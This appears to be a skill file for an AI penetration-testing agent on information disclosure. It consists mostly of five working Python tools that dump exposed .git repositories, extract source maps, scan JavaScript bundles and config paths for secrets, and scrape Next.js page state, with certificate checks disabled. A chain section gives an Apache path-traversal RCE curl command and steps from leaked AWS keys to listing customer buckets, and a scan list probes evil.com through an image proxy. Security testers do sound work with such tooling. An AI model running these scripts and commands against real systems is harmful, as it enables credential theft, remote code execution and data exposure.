<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: information-disclosure
description: Information disclosure testing with automated scripts for .git recovery, source map extraction, JS bundle secret scanning, and DVCS artifact exploitation
---

# Information Disclosure

Information leaks accelerate exploitation by revealing code, configuration, identifiers, and trust boundaries. Treat every response byte, artifact, and header as potential intelligence. Minimize, normalize, and scope disclosure across all channels.

---

## Automated Extraction Scripts

### Script 1 — .git Repository Recovery

When `/.git/` is accessible, reconstructs source code and extracts secrets from the git object store.

```python
#!/usr/bin/env python3
"""
.git repository dumper and secret extractor.
Reconstructs source from exposed .git/ directory.

Usage: python3 git_dump.py --url https://target.com --out ./git_dump
"""
import os, ssl, argparse, hashlib, zlib
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from pathlib import Path

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

GIT_FILES = [
    "HEAD", "config", "description", "COMMIT_EDITMSG",
    "index", "info/refs", "info/exclude", "logs/HEAD",
    "refs/heads/main", "refs/heads/master", "refs/heads/develop",
    "ORIG_HEAD", "MERGE_HEAD", "packed-refs",
    "objects/info/packs",
]

SECRET_PATTERNS = [
    (r'[A-Z_]*(KEY|SECRET|TOKEN|PASSWORD|PASS|PWD|API)[A-Z_]*\s*[=:]\s*["\']?([^\s\'"]{8,})', "Generic Secret"),
    (r'https://[a-f0-9]{32}@o[0-9]+\.ingest\.sentry\.io/[0-9]+', "Sentry DSN"),
    (r'sk-[A-Za-z0-9]{48}', "OpenAI Key"),
    (r'AKIA[0-9A-Z]{16}', "AWS Access Key"),
    (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key"),
    (r'ghp_[A-Za-z0-9]{36}', "GitHub PAT"),
    (r'xox[baprs]-[0-9A-Za-z\-]{10,72}', "Slack Token"),
    (r'-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----', "Private Key"),
    (r'[0-9a-f]{32}', "MD5/Hex Token (possible secret)"),
]

def fetch(base, path):
    url = f"{base}/.git/{path}"
    try:
        req = Request(url, headers={"User-Agent": UA})
        resp = urlopen(req, context=ctx, timeout=10)
        return resp.read()
    except HTTPError as e:
        if e.code == 404:
            return None
        return None
    except Exception:
        return None

def decompress_object(data):
    """Decompress a git object (zlib compressed)."""
    try:
        return zlib.decompress(data).decode(errors='replace')
    except Exception:
        return None

def parse_pack_index(data):
    """Extract object hashes from pack index v2."""
    import struct
    hashes = []
    if data[:8] != b'\xff\x74\x4f\x63\x00\x00\x00\x02':
        return hashes
    fan_out = struct.unpack('>256I', data[8:8+1024])
    total = fan_out[255]
    for i in range(total):
        offset = 8 + 1024 + i * 20
        h = data[offset:offset+20].hex()
        hashes.append(h)
    return hashes

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True, help="Base URL (e.g., https://target.com)")
parser.add_argument("--out", default="./git_dump")
args = parser.parse_args()

base = args.url.rstrip("/")
out_dir = Path(args.out)
out_dir.mkdir(parents=True, exist_ok=True)

print(f"[*] Target: {base}/.git/")

# Step 1: Check accessibility
head = fetch(base, "HEAD")
if not head:
    print("[-] .git/HEAD not accessible. Aborting.")
    exit(1)
print(f"[+] .git/HEAD: {head.decode(errors='replace').strip()}")

# Step 2: Download known files
downloaded = {}
for gf in GIT_FILES:
    data = fetch(base, gf)
    if data:
        path = out_dir / gf
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        downloaded[gf] = data
        print(f"[+] {gf} ({len(data)}B)")

# Step 3: Extract commit SHAs from logs/HEAD
commit_hashes = set()
if "logs/HEAD" in downloaded:
    import re
    logs = downloaded["logs/HEAD"].decode(errors='replace')
    commit_hashes.update(re.findall(r'\b([0-9a-f]{40})\b', logs))
    print(f"[*] Found {len(commit_hashes)} commit hashes from logs/HEAD")

# Step 4: Fetch and decompress objects
objects_found = []
for sha in list(commit_hashes)[:50]:  # Limit to avoid hammering
    obj_path = f"objects/{sha[:2]}/{sha[2:]}"
    data = fetch(base, obj_path)
    if data:
        decompressed = decompress_object(data)
        if decompressed:
            obj_file = out_dir / obj_path
            obj_file.parent.mkdir(parents=True, exist_ok=True)
            obj_file.write_text(decompressed)
            objects_found.append((sha, decompressed))
            print(f"[+] Object {sha[:8]}... ({len(decompressed)}B)")

# Step 5: Secret scan all recovered content
print(f"\n{'='*60}")
print(f"SECRET SCAN RESULTS")
print(f"{'='*60}")
import re
found_secrets = []
all_content = "\n".join([d for _, d in objects_found])
all_content += "\n".join([d.decode(errors='replace') for d in downloaded.values()])

for pattern, name in SECRET_PATTERNS:
    matches = re.findall(pattern, all_content, re.IGNORECASE)
    if matches:
        for m in (matches[:5] if isinstance(matches[0], str) else [x[0] for x in matches[:5]]):
            print(f"[SECRET] {name}: {str(m)[:80]}")
            found_secrets.append({"type": name, "value": str(m)})

print(f"\n[*] Total secrets found: {len(found_secrets)}")
print(f"[*] Objects recovered: {len(objects_found)}")
print(f"[*] Output directory: {out_dir}")
print(f"\nNext steps:")
print(f"  cd {out_dir} && git checkout -- . (reconstruct working tree)")
print(f"  trufflehog filesystem {out_dir} (deep secret scan)")
```

---

### Script 2 — Source Map Extractor and Deobfuscator

Finds `.map` files linked from JS bundles, downloads them, and extracts original source code.

```python
#!/usr/bin/env python3
"""
JS Source Map extractor.
Finds sourceMappingURL references in JS, downloads .map files,
extracts original source code.

Usage: python3 sourcemap_extract.py --url https://target.com --out ./src_extracted
"""
import re, json, ssl, os, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from urllib.parse import urljoin, urlparse
from pathlib import Path

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

SECRET_PATTERNS = [
    (r'[A-Z_]*(KEY|SECRET|TOKEN|PASSWORD|API)[A-Z_]*\s*[=:]\s*["\']([^\s\'"]{8,})["\']', "Secret"),
    (r'https://[a-f0-9]{32}@o\d+\.ingest\.sentry\.io/\d+', "Sentry DSN"),
    (r'AKIA[0-9A-Z]{16}', "AWS Key"),
    (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key"),
    (r'ghp_[A-Za-z0-9]{36}', "GitHub PAT"),
    (r'NEXT_PUBLIC_\w+\s*[=:]\s*["\']([^"\']{4,})["\']', "Next.js Public Env"),
    (r'REACT_APP_\w+\s*[=:]\s*["\']([^"\']{4,})["\']', "React Env"),
    (r'VITE_\w+\s*[=:]\s*["\']([^"\']{4,})["\']', "Vite Env"),
    (r'process\.env\.\w+', "Process Env Access"),
    (r'localhost:[0-9]{4,5}', "Internal Port"),
    (r'https?://[a-z0-9\-]+\.(internal|local|corp|intranet)', "Internal Host"),
    (r'/api/v[0-9]+/[a-z0-9\-/]+', "API Endpoint"),
    (r'(?:admin|internal|debug|private)/[a-z0-9\-/]+', "Sensitive Path"),
]

def fetch_text(url):
    try:
        req = Request(url, headers={"User-Agent": UA})
        resp = urlopen(req, context=ctx, timeout=15)
        return resp.read().decode(errors='replace')
    except Exception:
        return None

def fetch_bytes(url):
    try:
        req = Request(url, headers={"User-Agent": UA})
        resp = urlopen(req, context=ctx, timeout=15)
        return resp.read()
    except Exception:
        return None

def find_js_files(base_url):
    """Crawl homepage and find JS bundle URLs."""
    html = fetch_text(base_url)
    if not html:
        return []
    js_urls = re.findall(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', html)
    # Also look in _next/static, static/js, assets/js patterns
    js_urls += re.findall(r'["\'](/(?:_next|static|assets)/[^"\']+\.js)["\']', html)
    resolved = []
    for u in set(js_urls):
        if u.startswith("http"):
            resolved.append(u)
        else:
            resolved.append(urljoin(base_url, u))
    return resolved

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--out", default="./src_extracted")
parser.add_argument("--js-list", help="Optional: file with JS URLs (one per line)")
args = parser.parse_args()

out_dir = Path(args.out)
out_dir.mkdir(parents=True, exist_ok=True)

base = args.url.rstrip("/")

if args.js_list:
    js_files = [l.strip() for l in open(args.js_list) if l.strip()]
else:
    print(f"[*] Crawling {base} for JS files...")
    js_files = find_js_files(base)
    print(f"[*] Found {len(js_files)} JS files")

all_secrets = []
maps_downloaded = 0

for js_url in js_files:
    js_content = fetch_text(js_url)
    if not js_content:
        continue

    # Look for sourceMappingURL comment
    map_url_match = re.search(r'//# sourceMappingURL=(.+\.map)', js_content)
    if not map_url_match:
        # Check for inline data: URI
        inline_match = re.search(r'//# sourceMappingURL=data:application/json;base64,([A-Za-z0-9+/=]+)', js_content)
        if inline_match:
            import base64
            map_data = base64.b64decode(inline_match.group(1)).decode(errors='replace')
            map_url = js_url + ".inline"
        else:
            continue
    else:
        map_ref = map_url_match.group(1)
        if map_ref.startswith("http"):
            map_url = map_ref
        else:
            map_url = urljoin(js_url, map_ref)
        map_data = fetch_text(map_url)

    if not map_data:
        continue

    maps_downloaded += 1
    print(f"\n[+] Source map: {map_url[:80]}")

    try:
        sm = json.loads(map_data)
    except json.JSONDecodeError:
        print(f"  [!] Invalid JSON")
        continue

    sources = sm.get("sources", [])
    sources_content = sm.get("sourcesContent", [])

    print(f"  Sources: {len(sources)}")

    for i, (src_path, src_content) in enumerate(zip(sources, sources_content or [])):
        if not src_content:
            continue

        # Save extracted source
        clean_path = re.sub(r'^[./webpack://]+', '', src_path).lstrip('/')
        out_path = out_dir / clean_path
        out_path.parent.mkdir(parents=True, exist_ok=True)
        try:
            out_path.write_text(src_content)
        except Exception:
            continue

        # Scan for secrets
        for pattern, name in SECRET_PATTERNS:
            matches = re.findall(pattern, src_content, re.IGNORECASE)
            if matches:
                for m in matches[:3]:
                    val = m if isinstance(m, str) else m[1] if len(m) > 1 else m[0]
                    print(f"  [SECRET] {name} in {src_path}: {str(val)[:80]}")
                    all_secrets.append({"type": name, "file": src_path, "value": str(val)})

print(f"\n{'='*60}")
print(f"[*] Maps downloaded: {maps_downloaded}")
print(f"[*] Secrets found: {len(all_secrets)}")
print(f"[*] Source files extracted to: {out_dir}")
```

---

### Script 3 — JS Bundle Secret Scanner

Scans JavaScript bundles (without source maps) for hardcoded secrets and internal infrastructure hints.

```python
#!/usr/bin/env python3
"""
JS bundle secret scanner — no source map needed.
Downloads JS files and scans for secrets, internal endpoints, env vars.

Usage: python3 js_secret_scan.py --url https://target.com
"""
import re, ssl, json, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from urllib.parse import urljoin
from collections import defaultdict

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

PATTERNS = {
    "Sentry DSN":        r'https://[a-f0-9]{32}@o\d+\.ingest(?:\.us)?\.sentry\.io/\d+',
    "AWS Access Key":    r'AKIA[0-9A-Z]{16}',
    "AWS Secret Key":    r'(?:aws_secret|secretaccesskey)["\s:=]+([A-Za-z0-9/+]{40})',
    "Google API Key":    r'AIza[0-9A-Za-z\-_]{35}',
    "GitHub PAT":        r'(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}',
    "Slack Token":       r'xox[baprs]-[0-9A-Za-z\-]{10,72}',
    "Stripe Key":        r'(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}',
    "Twilio SID":        r'AC[a-z0-9]{32}',
    "JWT Secret":        r'jwt[_-]?secret["\s:=]+["\']([^\s"\']{8,})["\']',
    "DB Connection":     r'(?:postgres|mysql|mongodb|redis)://[^\s"\'<>]{10,}',
    "Internal Host":     r'https?://[a-z0-9\-]+\.(?:internal|local|corp|lan|priv|intra)\b[^\s"\']*',
    "Private IP Range":  r'https?://(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)[0-9.]+(?::[0-9]+)?[^\s"\']*',
    "Hex Subdomain":     r'https?://([0-9a-f]{6,16})\.[\w\-]+\.[a-z]{2,}',
    "NEXT_PUBLIC Env":   r'NEXT_PUBLIC_[A-Z_]+["\s:=]+["\']([^"\']{4,})["\']',
    "REACT_APP Env":     r'REACT_APP_[A-Z_]+["\s:=]+["\']([^"\']{4,})["\']',
    "VITE Env":          r'VITE_[A-Z_]+["\s:=]+["\']([^"\']{4,})["\']',
    "Bearer Token":      r'[Bb]earer\s+([A-Za-z0-9\-._~+/]{20,})',
    "Basic Auth":        r'[Bb]asic\s+([A-Za-z0-9+/]{20,}={0,2})',
    "Datadog Key":       r'(?:dd_api_key|datadog)["\s:=]+["\']([a-f0-9]{32})["\']',
    "OpenAI Key":        r'sk-[A-Za-z0-9]{48}',
    "Anthropic Key":     r'sk-ant-[A-Za-z0-9\-]{40,}',
    "Origin-Trial":      r'Origin-Trial["\s:=]+([A-Za-z0-9+/=]{20,})',
    "Webhook URL":       r'https://hooks\.(slack|discord)\.com/[^\s"\'<>]+',
    "Internal API Path": r'["\']/(admin|internal|debug|private|sys|mgmt)/[a-z0-9\-/]+["\']',
}

def fetch(url):
    try:
        req = Request(url, headers={"User-Agent": UA})
        resp = urlopen(req, context=ctx, timeout=20)
        return resp.read().decode(errors='replace')
    except Exception:
        return None

def find_js_bundles(base_url):
    html = fetch(base_url)
    if not html:
        return []
    urls = set()
    for pattern in [
        r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']',
        r'["\'](/_next/static/[^"\']+\.js)["\']',
        r'["\'](/static/js/[^"\']+\.js)["\']',
        r'["\'](/assets/[^"\']+\.js)["\']',
        r'["\'](/js/[^"\']+\.js)["\']',
    ]:
        for m in re.findall(pattern, html):
            if m.startswith("http"):
                urls.add(m)
            else:
                urls.add(urljoin(base_url, m))
    return list(urls)

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--js-list", help="Optional: file with JS URLs")
parser.add_argument("--report", default="js_secrets.json")
args = parser.parse_args()

base = args.url.rstrip("/")

if args.js_list:
    js_files = [l.strip() for l in open(args.js_list) if l.strip()]
else:
    print(f"[*] Discovering JS bundles from {base}...")
    js_files = find_js_bundles(base)
    print(f"[*] Found {len(js_files)} bundles")

findings = defaultdict(list)
total = 0

for js_url in js_files:
    content = fetch(js_url)
    if not content or len(content) < 100:
        continue

    bundle_findings = []
    for name, pattern in PATTERNS.items():
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            unique = list(set([str(m)[:120] for m in matches]))[:5]
            for val in unique:
                bundle_findings.append({"type": name, "value": val})
                total += 1

    if bundle_findings:
        print(f"\n[+] {js_url}")
        for f in bundle_findings:
            print(f"  [{f['type']}] {f['value']}")
        findings[js_url] = bundle_findings

# Save report
with open(args.report, "w") as f:
    json.dump(dict(findings), f, indent=2)

print(f"\n{'='*60}")
print(f"[*] Total findings: {total}")
print(f"[*] Affected bundles: {len(findings)}")
print(f"[*] Report saved: {args.report}")
```

---

### Script 4 — Sensitive File Scanner

Wordlist-based scanner for backup files, config files, debug endpoints, and API schemas.

```python
#!/usr/bin/env python3
"""
Sensitive file and endpoint scanner.
Checks for DVCS artifacts, config files, backup files, debug endpoints.

Usage: python3 sensitive_scan.py --url https://target.com [--threads 20]
"""
import ssl, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

TARGETS = {
    # DVCS
    "DVCS": [
        "/.git/HEAD", "/.git/config", "/.git/index", "/.git/COMMIT_EDITMSG",
        "/.svn/entries", "/.svn/wc.db", "/.hg/store/00manifest.i",
        "/.bzr/branch/format",
    ],
    # Config/Secrets
    "Config": [
        "/.env", "/.env.local", "/.env.production", "/.env.staging",
        "/config.json", "/config.yml", "/config.yaml",
        "/appsettings.json", "/appsettings.Development.json",
        "/web.config", "/app.config", "/settings.py",
        "/database.yml", "/secrets.yml",
        "/docker-compose.yml", "/docker-compose.yaml",
        "/.aws/credentials", "/.aws/config",
        "/credentials.json", "/service-account.json",
        "/phpinfo.php", "/info.php", "/test.php",
    ],
    # Backup/Temp
    "Backup": [
        "/backup.sql", "/backup.zip", "/backup.tar.gz",
        "/database.sql", "/db.sql", "/dump.sql",
        "/www.zip", "/site.zip", "/html.zip",
        "/index.php.bak", "/index.php~",
        "/config.php.bak", "/wp-config.php.bak",
    ],
    # API Schemas
    "API Schema": [
        "/swagger.json", "/swagger.yaml", "/swagger-ui.html",
        "/api-docs", "/api-docs.json",
        "/openapi.json", "/openapi.yaml",
        "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/v3/api-docs.yaml",
        "/api/swagger.json", "/api/openapi.json",
        "/graphql", "/graphiql", "/playground",
        "/api/graphql",
        # NestJS / Fastify defaults (commonly missed)
        "/docs", "/docs.json", "/docs.html", "/docs.yaml",
        "/documentation", "/documentation/json", "/documentation/yaml",
        "/api-json", "/api-doc",
        "/redoc", "/redoc.html",
        # Spring Boot (springdoc-openapi)
        "/v3/api-docs", "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
        # Flask/Django/Laravel
        "/apispec.json", "/apispec_1.json",
        "/schema.json", "/schema/",
        "/api/documentation", "/api-docs/v1", "/api-docs/v2",
        "/swagger/doc.json",
    ],
    # Debug/Admin
    "Debug": [
        "/debug", "/debug/pprof", "/_profiler", "/_profiler/phpinfo",
        "/actuator", "/actuator/env", "/actuator/health",
        "/actuator/beans", "/actuator/mappings", "/actuator/httptrace",
        "/.well-known/security.txt",
        "/server-status", "/server-info",
        "/status", "/metrics",
        "/_debug", "/admin/debug",
    ],
    # Framework Specific
    "Framework": [
        "/.rails_root", "/rails/info/properties",
        "/laravel/telescope", "/telescope", "/horizon",
        "/_symfony_profiler", "/__clockwork/app",
        "/django-admin", "/__debug__/",
        "/wp-json/wp/v2/users",
        "/wp-config.php", "/xmlrpc.php",
    ],
    # Source Maps
    "Source Map": [
        "/main.js.map", "/app.js.map", "/bundle.js.map",
        "/static/js/main.chunk.js.map",
        "/_next/static/chunks/main.js.map",
    ],
    # Next.js specific
    "Next.js": [
        "/_next/static/chunks/pages/_app.js",
        "/_next/static/chunks/framework.js",
        "/__NEXT_DATA__",
        "/api/auth/session",
        "/_next/image?url=https://evil.com&w=100&q=75",
    ],
}

def check(base, path, category):
    url = base.rstrip("/") + path
    try:
        req = Request(url, headers={"User-Agent": UA})
        resp = urlopen(req, context=ctx, timeout=8)
        content = resp.read()
        size = len(content)
        # Filter out redirect bait and empty responses
        if size < 20:
            return None
        # Check for meaningful content (not just generic error pages)
        content_preview = content[:200].decode(errors='replace')
        return {
            "category": category,
            "path": path,
            "url": url,
            "status": resp.status,
            "size": size,
            "preview": content_preview[:100].replace('\n', ' ')
        }
    except HTTPError as e:
        if e.code not in (404, 410):
            return {
                "category": category,
                "path": path,
                "url": url,
                "status": e.code,
                "size": 0,
                "preview": ""
            }
        return None
    except URLError:
        return None

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--threads", type=int, default=20)
args = parser.parse_args()

base = args.url.rstrip("/")
print(f"[*] Scanning {base}")

all_tasks = [(path, cat) for cat, paths in TARGETS.items() for path in paths]
print(f"[*] Checking {len(all_tasks)} paths...")

findings = []
with ThreadPoolExecutor(max_workers=args.threads) as ex:
    futs = {ex.submit(check, base, path, cat): (path, cat) for path, cat in all_tasks}
    for fut in as_completed(futs):
        result = fut.result()
        if result and result["status"] in (200, 206, 301, 302):
            findings.append(result)
            print(f"[FOUND][{result['category']}] {result['path']} -> {result['status']} ({result['size']}B)")
            if result.get("preview"):
                print(f"  Preview: {result['preview']}")

print(f"\n{'='*60}")
print(f"[*] Findings: {len(findings)}")

# Prioritize
critical = [f for f in findings if f["category"] in ("DVCS", "Config", "Backup") and f["status"] == 200]
if critical:
    print(f"\n[CRITICAL] {len(critical)} high-value exposures:")
    for f in critical:
        print(f"  {f['url']} ({f['size']}B)")
```

---

### Script 5 — Next.js `__NEXT_DATA__` and API Route Extractor

Parses Next.js pre-rendered state and discovers internal API routes.

```python
#!/usr/bin/env python3
"""
Next.js intelligence extractor.
Parses __NEXT_DATA__, discovers API routes, extracts embedded state.

Usage: python3 nextjs_extract.py --url https://target.com
"""
import re, json, ssl, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from urllib.parse import urljoin

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

SENSITIVE_KEYS = [
    "token", "secret", "key", "password", "auth", "apiKey", "accessToken",
    "refreshToken", "sessionToken", "csrfToken", "userId", "accountId",
    "internalId", "adminId", "role", "permissions", "email", "phone",
    "ssn", "creditCard", "cardNumber", "cvv",
]

def fetch(url):
    try:
        req = Request(url, headers={"User-Agent": UA, "Accept": "text/html,*/*"})
        resp = urlopen(req, context=ctx, timeout=15)
        return resp.read().decode(errors='replace'), resp.headers
    except Exception as e:
        return None, None

def extract_next_data(html):
    match = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.+?)</script>', html, re.DOTALL)
    if match:
        try:
            return json.loads(match.group(1))
        except Exception:
            return None
    return None

def find_sensitive_values(obj, path="", findings=None):
    if findings is None:
        findings = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            full_path = f"{path}.{k}" if path else k
            if any(sk.lower() in k.lower() for sk in SENSITIVE_KEYS):
                if v and isinstance(v, (str, int)) and str(v) not in ("null", "undefined", ""):
                    findings.append({"path": full_path, "value": str(v)[:100]})
            find_sensitive_values(v, full_path, findings)
    elif isinstance(obj, list):
        for i, item in enumerate(obj[:10]):
            find_sensitive_values(item, f"{path}[{i}]", findings)
    return findings

def discover_api_routes(base_url):
    """Probe common Next.js API routes."""
    common_routes = [
        "/api/auth/session", "/api/auth/csrf", "/api/auth/providers",
        "/api/user", "/api/me", "/api/profile",
        "/api/config", "/api/settings",
        "/api/health", "/api/status",
        "/api/v1/me", "/api/v1/user",
        "/api/v2/me", "/api/v2/user",
        "/_next/data/", "/__nextjs_original-stack-frames",
    ]
    found = []
    for route in common_routes:
        url = base_url.rstrip("/") + route
        try:
            req = Request(url, headers={"User-Agent": UA, "Accept": "application/json"})
            resp = urlopen(req, context=ctx, timeout=8)
            content = resp.read()
            if len(content) > 10:
                found.append({"route": route, "status": resp.status, "size": len(content), "preview": content[:150].decode(errors='replace')})
        except HTTPError as e:
            if e.code not in (404, 405):
                found.append({"route": route, "status": e.code, "size": 0, "preview": ""})
        except Exception:
            pass
    return found

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--crawl-pages", nargs='*', default=["/", "/login", "/dashboard", "/account", "/settings"])
args = parser.parse_args()

base = args.url.rstrip("/")
all_next_data = {}

for page in args.crawl_pages:
    url = base + page
    html, headers = fetch(url)
    if not html:
        continue

    next_data = extract_next_data(html)
    if next_data:
        print(f"\n[+] __NEXT_DATA__ found on {page}")
        print(f"  Build ID: {next_data.get('buildId', 'N/A')}")
        print(f"  Page: {next_data.get('page', 'N/A')}")

        sensitive = find_sensitive_values(next_data)
        if sensitive:
            print(f"  [SENSITIVE VALUES]")
            for s in sensitive:
                print(f"    {s['path']}: {s['value']}")

        # Extract query/props
        props = next_data.get("props", {})
        page_props = props.get("pageProps", {})
        if page_props:
            print(f"  pageProps keys: {list(page_props.keys())[:20]}")

        all_next_data[page] = next_data

    # Also look for embedded JSON state in other script tags
    json_blobs = re.findall(r'<script[^>]*>\s*window\.__(?:STATE|INITIAL_STATE|STORE|DATA)__\s*=\s*({.+?})\s*;?\s*</script>', html, re.DOTALL)
    for blob in json_blobs:
        try:
            state = json.loads(blob)
            sensitive = find_sensitive_values(state)
            if sensitive:
                print(f"[WINDOW STATE] Found on {page}")
                for s in sensitive[:10]:
                    print(f"  {s['path']}: {s['value']}")
        except Exception:
            pass

print(f"\n[*] Probing API routes...")
api_routes = discover_api_routes(base)
for r in api_routes:
    if r["status"] == 200:
        print(f"[+] {r['route']} -> {r['status']} ({r['size']}B)")
        if r.get("preview"):
            print(f"  {r['preview'][:100]}")
```

---

## Attack Surface

- Errors and exception pages: stack traces, file paths, SQL, framework versions
- Debug/dev tooling reachable in prod: debuggers, profilers, feature flags
- DVCS/build artifacts and temp/backup files: .git, .svn, .hg, .bak, .swp, archives
- Configuration and secrets: .env, phpinfo, appsettings.json, Docker/K8s manifests
- API schemas and introspection: OpenAPI/Swagger, GraphQL introspection, gRPC reflection
- Client bundles and source maps: webpack/Vite maps, embedded env, `__NEXT_DATA__`, static JSON
- Headers and response metadata: Server/X-Powered-By, tracing, ETag, Accept-Ranges, Server-Timing
- Storage/export surfaces: public buckets, signed URLs, export/download endpoints
- Observability/admin: /metrics, /actuator, /health, tracing UIs (Jaeger, Zipkin), Kibana, Admin UIs
- Directory listings and indexing: autoindex, sitemap/robots revealing hidden routes

## Triage Rubric

- **Critical**: Credentials/keys; signed URL secrets; config dumps; unrestricted admin/observability panels
- **High**: Versions with reachable CVEs; cross-tenant data; caches serving cross-user content; .git with secrets
- **Medium**: Internal paths/hosts enabling LFI/SSRF pivots; source maps revealing hidden endpoints
- **Low**: Generic headers, marketing versions, intended documentation without exploit path

## Exploitation Chains

### .git → Credentials → Cloud Access
```
1. /.git/HEAD accessible → HTTP 200
2. git_dump.py extracts objects, finds .env in commit history
3. .env contains: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
4. aws s3 ls → lists all customer buckets
5. CVSS: Critical (9.8) — unauthenticated cloud takeover
```

### Source Map → Hidden Admin Endpoint → Auth Bypass
```
1. JS bundle contains: //# sourceMappingURL=main.js.map
2. sourcemap_extract.py finds /admin/users route in source
3. Route is not in OpenAPI docs — undocumented
4. No authorization check on that route
5. CVSS: High (8.8) — unauthorized admin access
```

### Version Disclosure → CVE → RCE
```
1. Server: Apache/2.4.49 (from header)
2. CVE-2021-41773: Path traversal + RCE
3. curl -s "https://target.com/cgi-bin/.%2e/.%2e/.%2e/bin/sh" -d "echo;id"
4. uid=daemon → RCE confirmed
5. CVSS: Critical (9.8)
```

### NEXT_DATA → Internal ID → IDOR
```
1. __NEXT_DATA__ on /dashboard contains userId: "usr_12345abc"
2. Also exposes organizationId: "org_67890xyz"
3. GET /api/orgs/org_67890xyz/members → returns all org members
4. GET /api/orgs/DIFFERENT_ORG_ID/members → also returns data (IDOR)
5. CVSS: High (7.5) — cross-tenant data exposure
```

## Testing Methodology

1. **Run sensitive_scan.py** — covers DVCS, configs, backups, API schemas, debug endpoints
2. **Run js_secret_scan.py** — covers JS bundles without source maps
3. **Run sourcemap_extract.py** — extracts full source where .map files are accessible
4. **Run nextjs_extract.py** — specific to Next.js targets
5. **Run git_dump.py** if `/.git/HEAD` returns 200
6. **Correlate**: versions → CVE, paths → LFI/RCE, keys → cloud access, schemas → auth bypass

## Validation

1. Provide raw evidence (headers/body/artifact) and explain exact data revealed
2. Determine intent: cross-check docs/UX; classify per triage rubric
3. Attempt minimal, reversible exploitation or present a concrete step-by-step chain
4. Show reproducibility and minimal request set
5. Bound scope (user, tenant, environment) and data sensitivity classification

## False Positives

- Intentional public docs or non-sensitive metadata with no exploit path
- Generic errors with no actionable details
- Redacted fields that do not change differential oracles
- Version banners with no exposed vulnerable surface and no chain
- Owner-visible-only details that do not cross identity/tenant boundaries
